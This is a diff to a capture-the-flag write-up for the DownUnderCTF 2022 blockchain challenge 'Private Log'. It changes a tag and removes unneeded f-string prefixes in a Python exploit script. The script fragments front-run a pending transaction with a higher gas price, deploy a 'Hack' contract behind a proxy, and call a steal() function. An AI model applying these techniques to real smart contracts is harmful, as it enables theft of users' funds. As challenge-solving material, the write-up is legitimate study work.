@@ -2,6 +2,7 @@
 title: Blockchain - Private Log
 description: 2022 | DownUnderCTF | blockchain
 tags:
+    - smart contract
     - proxy contract
 ---
 
@@ -161,7 +162,7 @@ while True:
 	if tx_hashes := tx_filter.get_new_entries():
 		tx = w3.eth.get_transaction(tx_hashes[0])
 		logEntry, password, _ = decode_abi(['string', 'string', 'bytes32'], bytes.fromhex(tx.input[10:]))
-		transact(f"contract_log.functions.createLogEntry('under the control', password, newHash)", gas_price=w3.eth.gas_price + 100)
+		transact("contract_log.functions.createLogEntry('under the control', password, newHash)", gas_price=w3.eth.gas_price + 100)
 		break
 
 curr_nonce = w3.eth.get_transaction_count(account.address)
@@ -191,7 +192,7 @@ print(w3.eth.getStorageAt(proxy_addr, _IMPLEMENTATION_SLOT).hex())
 
 curr_nonce = w3.eth.get_transaction_count(account.address)
 while target_nonce > curr_nonce:
-	transact(f"contract_log.functions.createLogEntry('under the control', 'password', newHash)")
+	transact("contract_log.functions.createLogEntry('under the control', 'password', newHash)")
 	curr_nonce += 1
 
 hack_source = """
@@ -205,10 +206,10 @@ contract Hack {
 """
 _, hack_interface = compile_source(hack_source).popitem()
 hack_contract = w3.eth.contract(abi=hack_interface['abi'], bytecode=hack_interface['bin'])
-print(transact(f"hack_contract.constructor()", gas=hack_contract.constructor().estimateGas() * 2).contractAddress)
+print(transact("hack_contract.constructor()", gas=hack_contract.constructor().estimateGas() * 2).contractAddress)
 
 contract_hack = w3.eth.contract(address=proxy_addr, abi=hack_interface['abi'])
-transact(f"contract_hack.functions.steal()")
+transact("contract_hack.functions.steal()")
 
 print(requests.get(f'https://blockchain-privatelog-{base_id}.2022.ductf.dev/challenge/solve').content)
 ```
